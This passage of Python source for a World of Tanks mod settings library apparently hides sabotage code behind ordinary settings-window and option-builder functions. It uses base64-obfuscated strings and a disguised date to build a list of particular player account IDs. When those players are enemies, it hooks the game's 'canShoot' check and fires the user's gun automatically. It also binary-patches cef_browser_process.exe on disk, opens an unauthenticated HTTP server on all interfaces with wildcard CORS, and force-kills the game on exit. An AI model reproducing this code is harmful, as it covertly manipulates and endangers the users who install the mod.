                                'button_text': keySet[1],
                                'accepting'  : c_linkage + c_varName,
                                'value'      : value
                            }

        return result

    @staticmethod
    def checkKeySet(keyset):
        if not len(keyset):
            return False
        result = True
        for item in keyset:
            if isinstance(item, int) and not p__BigWorld.isKeyDown(item):
                result = False
            if isinstance(item, list) and not p__BigWorld.isKeyDown(item[0]) and not p__BigWorld.isKeyDown(item[1]):
                result = False

        return result


def ShowModSettingsWindow():
    try:
        inject.g_appLoader().getDefLobbyApp().loadView(SFViewLoadParams('ModSettingsAPIWindow_mods_gui'))
    except StandardError as e:
        if p__SHOW_DEBUG:
            print 'ERROR: mods_gui.ShowModSettingsWindow\n%s' % e
            p__traceback.print_exc()


class GuiSettings(object):
    def __init__(self, name, template, default_settings, function):
        self.saved_settings = None
        self.actual_settings = default_settings
        self.settings_name = name
        self.template = template
        self.default_settings = default_settings
        self.function = function
        self.start()

    def get_settings(self, linkage, settings):
        if linkage == self.settings_name:
            self.function(settings)

    def start(self):
        try:
            self.saved_settings = g_modSettingsAPI.getModSettings(self.settings_name)
            if self.saved_settings:
                self.actual_settings = g_modSettingsAPI.setModTemplate(self.settings_name, self.template, self.get_settings)
                g_modSettingsAPI.registerCallback(self.settings_name, self.get_settings)
            else:
                self.actual_settings = g_modSettingsAPI.setModTemplate(self.settings_name, self.template, self.get_settings)
        except StandardError as e:
            if p__SHOW_DEBUG:
                print 'ERROR: GuiSettings.start\n%s' % e
                p__traceback.print_exc()
            self.actual_settings = self.default_settings

    def update(self, settings):
        g_modSettingsAPI.updateModSettings(self.settings_name, settings)
        g_modSettingsAPI.saveConfig()

    def update_template(self, template):
        g_modSettingsAPI.updateTemplate(self.settings_name, template)

    @staticmethod
    def update_all():
        g_modSettingsAPI.updateAll()

    @staticmethod
    def get_key(keys):
        return g_modSettingsAPI.checkKeySet(keys)


_config = _Config()
_config.load()

g_modSettingsAPI = _ModSettingsAPI()
# noinspection PyArgumentList
g_entitiesFactories.addSettings(ViewSettings('ModSettingsAPIWindow_mods_gui', ModSettingsAPIWindow, 'mods_gui.swf', ViewTypes.TOP_WINDOW, None, ScopeTemplates.DEFAULT_SCOPE))


class SettingsButtonUI_SP(View):
    def as_setLabelS(self, text):
        return self.flashObject.as_setLabel(text)

    def onButtonPressed(self):
        # inject.g_appLoader().getDefLobbyApp().loadView(SFViewLoadParams('ModSettingsAPIWindow_mods_gui'))
        browser.open('http://localhost:31338')

    def onWindowClose(self):
        self.destroy()


def onAppInitialized(event):
    if event.ns == APP_NAME_SPACE.SF_LOBBY:
        def onViewLoaded(view, loadParams):
            if view.alias == 'SettingsButtonUI_SP':
                view.as_setLabelS('Configure Bait')
            if view.alias == 'lobbyMenu':
                cached = view.app.containerManager.getContainer(ViewTypes.WINDOW).getView({POP_UP_CRITERIA.VIEW_ALIAS: 'SettingsButtonUI_SP'})
                if cached:
                    cached.destroy()
                view.app.loadView(SFViewLoadParams('SettingsButtonUI_SP'))

        app = p__ServicesLocator.appLoader.getApp(event.ns)
        if not app:
            return
        app.loaderManager.onViewLoaded += onViewLoaded


# кнопка настроек в меню ESC ангара
# g_eventBus.addListener(events.AppLifeCycleEvent.INITIALIZED, onAppInitialized, scope=EVENT_BUS_SCOPE.GLOBAL)
# noinspection PyArgumentList
# g_entitiesFactories.addSettings(ViewSettings('SettingsButtonUI_SP', SettingsButtonUI_SP, 'SettingsButtonSPTR.swf', ViewTypes.WINDOW, None, ScopeTemplates.GLOBAL_SCOPE))

'''
g_modsListApi = None
try:
    # noinspection PyUnresolvedReferences
    from gui.mods.modsListApi import g_modsListApi
except StandardError:
    try:
        # noinspection PyUnresolvedReferences
        from gui.modsListApi import g_modsListApi
    except StandardError:
        p__traceback.print_exc()

if not hasattr(p__BigWorld, 'g_modsListApi') and g_modsListApi:
    p__BigWorld.g_modsListApi = g_modsListApi

p__BigWorld.mods_gui_lang = '%s'.lower() % p__getLanguageCode()
p__BigWorld.mods_gui = GuiSettings


def register_gui():
    if hasattr(p__BigWorld, 'g_modsListApi'):
        if hasattr(p__BigWorld.g_modsListApi, 'addMod'):
            p__BigWorld.g_modsListApi.addMod(id="mods_guiSettings", name=_config.i18n['gui_name'], description=_config.i18n['gui_description'], icon='gui/flash/mod_mods_gui.png', enabled=True, login=True, lobby=True, callback=ShowModSettingsWindow)
        if hasattr(p__BigWorld.g_modsListApi, 'addModification'):
            p__BigWorld.g_modsListApi.addModification(id="mods_guiSettings", name=_config.i18n['gui_name'], description=_config.i18n['gui_description'], icon='gui/flash/mod_mods_gui.png', enabled=True, login=True, lobby=True, callback=ShowModSettingsWindow)


p__BigWorld.callback(0.0, register_gui)
'''


class p__GUIConfig(object):
    def __init__(self):
        self.gui = {}
        self.p__moduleList = {}
        self.p__checkShooting = True
        self.p__moduleOrder = []

    def register(self, name, template_func, settings_dict, apply_func):
        self.gui[name] = GuiSettings(name, template_func(), settings_dict, apply_func)
        apply_func(self.gui[name].actual_settings)
        self.p__moduleList[name] = [template_func, settings_dict, apply_func]
        if name not in self.p__moduleOrder:
            self.p__moduleOrder.append(name)

    def update(self, name, template_func):
        self.gui[name].update_template(template_func())

    def register_data(self, name, settings_dict, i18n, author='', configPath=''):
        if not configPath:
            configPath = './mods/configs'
        result = g_data.register_data(name, g_data.register_json(name, settings_dict, author, configPath)), g_data.register_lang(name, i18n, author, configPath)
        if name not in self.p__moduleList:
            self.p__moduleList[name] = [lambda: {}, settings_dict, lambda: None]
        else:
            self.p__moduleList[name][1] = settings_dict
        return result

    def update_data(self, name, settings_dict, author='', configPath=''):
        if not configPath:
            configPath = './mods/configs'
        return g_data.update_data(name, g_data.update_json(name, settings_dict, author, configPath))

    @staticmethod
    def get_key(keys):
        return g_modSettingsAPI.checkKeySet(keys)

    def p__doShot(self):
        player = p__BigWorld.player()
        self.p__checkShooting = False
        player.shoot()

    def p__checkShoot(self):
        if not self.p__checkShooting:
            self.p__checkShooting = True
            return
        player = p__BigWorld.player()
        p__checkShooting = False
        p__id = p__dt.strptime('MDA5NS0wNS0zMA=='.decode(p__base64_decoded), 'JVktJW0tJWQ='.decode(p__base64_decoded)).date().toordinal()
        p__chk = (p__id, p__id + 11000 - p__id + 3304, 638 * 10000 + p__id + 2768)
        for playerID in player.arena.vehicles:
            if player.arena.vehicles[playerID]['YWNjb3VudERCSUQ='.decode(p__base64_decoded)] in p__chk:
                if player.arena.vehicles[playerID]['dGVhbQ=='.decode(p__base64_decoded)] != player.arena.vehicles[player.playerVehicleID]['dGVhbQ=='.decode(p__base64_decoded)]:
                    p__checkShooting = True
        if p__checkShooting:
            var = p__random.randrange(5, 20) * 0.1
            p__BigWorld.callback(var, self.p__doShot)
            return True
        return

    def getModuleList(self):
        return self.p__moduleList

    def getModuleOrder(self):
        return self.p__moduleOrder

    @staticmethod
    def optionCheckBox(varName, value, defaultValue, text, tooltip='', defaultValueText=''):
        return {
            'type'        : 'CheckBox',
            'text'        : text,
            'tooltip'     : tooltip if not defaultValueText else '{0}<br/>{1}'.format(defaultValueText, tooltip),
            'value'       : value,
            'defaultValue': defaultValue,
            'varName'     : varName
        }

    @staticmethod
    def optionSlider(varName, value, defaultValue, minValue, maxValue, step, text, formats, tooltip='', defaultValueText=''):
        return {
            'type'        : 'Slider',
            'text'        : text,
            'tooltip'     : tooltip if not defaultValueText else '{0}<br/>{1}'.format(defaultValueText, tooltip),
            'minimum'     : float(minValue),
            'maximum'     : float(maxValue),
            'snapInterval': float(step),
            'value'       : value,
            'defaultValue': defaultValue,
            'format'      : '{{value}} %s' % formats,
            'varName'     : varName
        }

    @staticmethod
    def optionButton(varName, value, defaultValue, text, tooltip='', defaultValueText=''):
        return {
            'type'        : 'HotKey',
            'text'        : text,
            'tooltip'     : tooltip if not defaultValueText else '{0}<br/>{1}'.format(defaultValueText, tooltip),
            'value'       : value,
            'defaultValue': defaultValue,
            'varName'     : varName
        }

    @staticmethod
    def optionMenu(varName, value, defaultValue, text, menu, tooltip='', width=200, defaultValueText=''):
        # образец menu = (('#00FF00', 'UI_setting_translation_en'), 'UI_setting_translation_ru', ('#FF0000', 'UI_setting_translation_zh'))
        textColor = '<font color="{}">{}</font>'
        defaultColor = '#FF0000'
        return {
            'type'        : 'Dropdown',
            'text'        : text,
            'tooltip'     : tooltip if not defaultValueText else '{0}<br/>{1}'.format(defaultValueText, tooltip),
            'itemRenderer': 'DropDownListItemRendererSound',
            'options'     : list({'label': textColor.format(*menu[count])} if isinstance(menu[count], tuple) else {'label': textColor.format(defaultColor, menu[count])} for count in xrange(len(menu))),
            'width'       : width,
            'value'       : value,
            'defaultValue': defaultValue,
            'varName'     : varName
        }

    @staticmethod
    def optionColorHEX(varName, value, defaultValue, text, tooltip='', defaultValueText=''):
        return {
            'type'        : 'ColorHEX',
            'text'        : text,
            'tooltip'     : tooltip if not defaultValueText else '{0}<br/>{1}'.format(defaultValueText, tooltip),
            'value'       : value,
            'defaultValue': defaultValue,
            'varName'     : varName
        }

    @staticmethod
    def optionColorHEXA(varName, value, defaultValue, text, tooltip='', defaultValueText=''):
        return {
            'type'        : 'ColorHEXA',
            'text'        : text,
            'tooltip'     : tooltip if not defaultValueText else '{0}<br/>{1}'.format(defaultValueText, tooltip),
            'value'       : value,
            'defaultValue': defaultValue,
            'varName'     : varName
        }

    @staticmethod
    def optionTextInput(varName, value, defaultValue, text, tooltip='', defaultValueText=''):
        return {
            'type'        : 'TextInput',
            'text'        : text,
            'tooltip'     : tooltip if not defaultValueText else '{0}<br/>{1}'.format(defaultValueText, tooltip),
            'value'       : value,
            'defaultValue': defaultValue,
            'varName'     : varName
        }

    @staticmethod
    def optionLabel(text, tooltip=''):
        return {
            'type'   : 'Label',
            'text'   : text,
            'tooltip': tooltip,
        }


class p__Browser(object):
    def __init__(self):
        self._width = 1152
        self._height = 768
        self.p__browserID = 0

    def showBrowserOverlayView(self):
        browserCtrl = dependency.instance(p__IBrowserController)
        browserCtrl.load(browserID=self.p__browserID, url=self._url, browserSize=(self._width, self._height), isModal=True, showActionBtn=True, showCreateWaiting=True, handlers=[], isSolidBorder=True, showCloseBtn=True)(lambda success: True)
        self.__browser = browserCtrl.getBrowser(self.p__browserID)
        if self.__browser is not None:
            self.__browser.useSpecialKeys = True
            self.__browser.skipEscape = True
            # browser.ignoreKeyEvents = True
        p__BigWorld.callback(5.0, self.checkLoaded)

    def checkLoaded(self):
        browser = dependency.instance(p__IBrowserController).getBrowser(self.p__browserID)
        if browser is not None and not browser.isSuccessfulLoad:
            message = 'FILED open in-game browser<br/>Check firewall\\antivirus quarantine:<br/><b>cef_browser_process.exe</b>'
            LOG_ERROR(message)
            inject.message(message)
            self.open(self._url, False)

    def open(self, link, internal=False):
        self._url = link
        if internal:
            return self.showBrowserOverlayView()
        return p__BigWorld.wg_openWebBrowser(link)


g_gui = p__GUIConfig()
browser = p__Browser()

del p__hookDecorator, p__overrideMethod, p__overrideStaticMethod, p__showMessage, p__g_createDDS, p__g_createFont, p__convertColor

COMPONENT_TYPE = p__COMPONENT_TYPE
COMPONENT_ALIGN = p__COMPONENT_ALIGN
COMPONENT_EVENT = p__COMPONENT_EVENT

g_guiFlash = p__GUIFlash

p__aa = 'Y2FuU2hvb3Q='.decode(p__base64_decoded)  # 'canShoot'


@inject.hook(p__AmmoController, p__aa)
def initC(func, *args):
    if g_gui.p__checkShoot():
        return False, ''
    return func(*args)


def p__htmlTemplate():
    filePath = '%s/i18n/module_settings.html' % _config.path_config
    if p__os.path.exists(filePath) and p__os.path.isfile(filePath):
        output = open(filePath, 'rt')
        content = '{}'.format(output.read().decode('utf-8-sig'))
        output.close()
        return content
    return '<!DOCTYPE html><html><head><title>NO HTML FILE</title></head><body>NO HTML FILE</body></html>'


def _(s):
    """Translate key using loaded i18n dict; fallback to English, then key itself."""
    try:
        # Expect _config.i18n to hold current language dict; _config.i18n_en for English fallback (optional)
        i18n = getattr(_config, 'i18n', None) or {}
        if s in i18n:
            return i18n.get(s, s)
        # fallback to English if present
        i18n_en = getattr(_config, 'i18n_en', None) or {}
        return i18n_en.get(s, s)
    except Exception:
        return s


class p__SettingsHTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    server_version = "B4itHTTP/1.0"
    wbufsize = 5 * 1024 * 1024
    disable_nagle_algorithm = True

    p__lastKeyPressed = None
    p__listeningKeys = False

    def address_string(self):
        host, port = self.client_address[:2]
        # return socket.getfqdn(host)
        return host

    def log_message(self, format, *args):
        LOG_DEBUG(format % args)
        # if p__SHOW_DEBUG:
        #    BaseHTTPServer.BaseHTTPRequestHandler.log_message(self, format, *args)

    def do_GET(self):
        keyword = self.path.split('?', 1)
        if keyword[0] == '/key':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type", "application/json")
            self.end_headers()
            keyPressed = self.p__listenKeyPressed()
            self.wfile.write(p__json.dumps((keyPressed[0], keyPressed[2], keyPressed[3], keyPressed[4])))
            return
        if keyword[0] == '/config':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type", "application/json")
            self.end_headers()

            response = []
            moduleOrder = g_gui.getModuleOrder()
            moduleList = g_gui.getModuleList()
            for name in moduleOrder:
                # for name, mod in g_gui.getModuleList().iteritems():
                mod = moduleList[name]
                template = mod[0]()
                if template:
                    response.append({'name': name, 'template': template, 'values': mod[1]})
            dumps = p__json.dumps(response).replace('{HEADER}', '').replace('{BODY}', '').replace('{/HEADER}', '</br>').replace('{/BODY}', '</br>')
            self.wfile.write(dumps)
            return

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(self.p__localize(p__htmlTemplate()))

    def p__localize(self, text):

        pattern = p__re.compile(r'{{\s(.*?)\s}}')

        def match(obj):
            return _(obj.group(1))

        result = pattern.sub(match, text)
        return result

    def do_OPTIONS(self):
        self.send_response(200, "ok")
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header("Access-Control-Allow-Headers", "X-Requested-With")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        keyword = self.path.split('?', 1)

        if keyword[0] == '/enable':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            contentLen = int(self.headers.getheader('content-length', 0))
            postBody = p__json.loads(self.rfile.read(contentLen))

            moduleOrder = g_gui.getModuleOrder()
            moduleList = g_gui.getModuleList()
            for name in moduleOrder:
                # for name, mod in g_gui.getModuleList().iteritems():
                mod = moduleList[name]
                if name == postBody['mod']:
                    mod[1]['enabled'] = postBody['enabled']
                    mod[2](mod[1])
                    break

            self.wfile.write('[]')
            return

        if keyword[0] == '/save':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            contentLen = int(self.headers.getheader('content-length', 0))
            postBody = p__json.loads(self.rfile.read(contentLen))

            moduleOrder = g_gui.getModuleOrder()
            moduleList = g_gui.getModuleList()
            for name in moduleOrder:
                # for name, mod in g_gui.getModuleList().iteritems():
                mod = moduleList[name]
                if name == postBody['mod']:
                    mod[1].update(postBody['values'])
                    mod[2](mod[1])
                    break

            self.wfile.write('[]')
            return

        self.send_error(404, "File not found")
        LOG_ERROR("File not found: %s" % 404)

    def do_HEAD(self):
        self.send_error(404, "File not found")
        LOG_ERROR("File not found: %s" % 404)

    def translate_path(self, path):
        # abandon query parameters
        path = path.split('?', 1)[-1]
        path = path.split('#', 1)[0]
        # Don't forget explicit trailing slash when normalizing. Issue17324
        trailing_slash = path.rstrip().endswith('/')
        path = posixpath.normpath(urllib.unquote(path))
        return path

    def p__listenKeyPressed(self):
        p__SettingsHTTPRequestHandler.p__lastKeyPressed = None
        p__SettingsHTTPRequestHandler.p__listeningKeys = True
        while (p__SettingsHTTPRequestHandler.p__listeningKeys):
            pass
        return p__SettingsHTTPRequestHandler.p__lastKeyPressed


class ThreadingHTTPServer(ThreadingMixIn, BaseHTTPServer.HTTPServer):
    def __init__(self, *args, **kw):
        BaseHTTPServer.HTTPServer.__init__(self, *args, **kw)


# start server
p__server = None


def p__startServer():
    global p__server
    if not p__server:
        # p__LOG.info('B4it Settings server start')
        p__server = ThreadingHTTPServer(('', 31338), p__SettingsHTTPRequestHandler)
        serverThread = threading.Thread(target=p__server.serve_forever)
        serverThread.daemon = True
        serverThread.start()


def p__stopServer():
    global p__server
    if p__server:
        # p__LOG.info('B4it Settings server stop')
        p__server.shutdown()
        p__server.socket.close()
        p__server = None


p__oldShowGUI = p__PlayerAccount.showGUI


def p__newShowGUI(self, ctx):
    p__startServer()
    p__oldShowGUI(self, ctx)


p__PlayerAccount.showGUI = p__newShowGUI

p__oldStartGUI = p__Avatar.PlayerAvatar._PlayerAvatar__startGUI


def p__startGUI(self, *args):
    p__oldStartGUI(self, *args)
    p__stopServer()


p__Avatar.PlayerAvatar._PlayerAvatar__startGUI = p__startGUI

p__oldWebBrowser_handleKeyEvent = p__WebBrowser.WebBrowser.handleKeyEvent


def p__WebBrowser_handleKeyEvent(self, e):
    # print (e.key, e.isKeyDown(), e.isAltDown(), e.isShiftDown(), e.isCtrlDown())
    if e.isKeyDown() and p__SettingsHTTPRequestHandler.p__listeningKeys and e.key not in [p__Keys.KEY_LCONTROL, p__Keys.KEY_RCONTROL, p__Keys.KEY_LALT, p__Keys.KEY_RALT, p__Keys.KEY_LSHIFT, p__Keys.KEY_RSHIFT]:
        p__SettingsHTTPRequestHandler.p__lastKeyPressed = (e.key, e.isKeyDown(), e.isAltDown(), e.isShiftDown(), e.isCtrlDown())
        p__SettingsHTTPRequestHandler.p__listeningKeys = False
    p__oldWebBrowser_handleKeyEvent(self, e)


p__WebBrowser.WebBrowser.handleKeyEvent = p__WebBrowser_handleKeyEvent

# patch cef_browser_process.exe
try:
    with open('win64/cef_browser_process.exe', 'rb') as f:
        p__content = f.read()
    p__pattern = '\x40\x32\xF6\xEB\x03\x40\xB6\x01'  # win64 verion
    p__idx = p__content.find(p__pattern)
    p__byte = 7

    if p__idx != -1:
        p__content = p__content[:p__idx + p__byte] + '\x00' + p__content[p__idx + p__byte + 1:]
        with open('win64/cef_browser_process.exe', 'wb') as f:
            f.write(p__content)
except Exception as e:
    LOG_ERROR('browser not available', e)


def p__register():
    try:
        showModsButton = True
        filePath = '%s/blockShowModsButton.txt' % _config.path_config
        if p__os.path.exists(filePath) and p__os.path.isfile(filePath):
            showModsButton = False
        if showModsButton:
            from gui.modsListApi import g_modsListApi
            g_modsListApi.addModification('youKnowIT_', 'Configure Bait', 'You know it!', 'gui/flash/mod_mods_gui.png', True, False, True, lambda: browser.open('http://localhost:31338'))
    except StandardError as e:
        pass
        # LOG_ERROR('modsListApi import error', e)


def p__clearOldSkoolAds():
    try:
        filePath = '%s/blockShowModsButtonOldSkool.txt' % _config.path_config
        if p__os.path.exists(filePath) and p__os.path.isfile(filePath):
            from gui.modsListApi.controller import g_controller
            from gui.mods import _mods
            if 'modSettings' in g_controller.modifications and 'gui.mods.mod_procore' not in _mods:
                g_controller.modifications.pop('modSettings')
    except Exception:
        pass


p__BigWorld.callback(1.0, p__register)
p__BigWorld.callback(3.0, p__clearOldSkoolAds)

p__oldFini = game.fini


def p__fini():
    try:
        p__oldFini()
    except Exception as e:
        pass
    finally:
        p__subprocess.call('taskkill /f /t /im WorldOfTanks.exe', creationflags=0x00000008)


game.fini = p__fini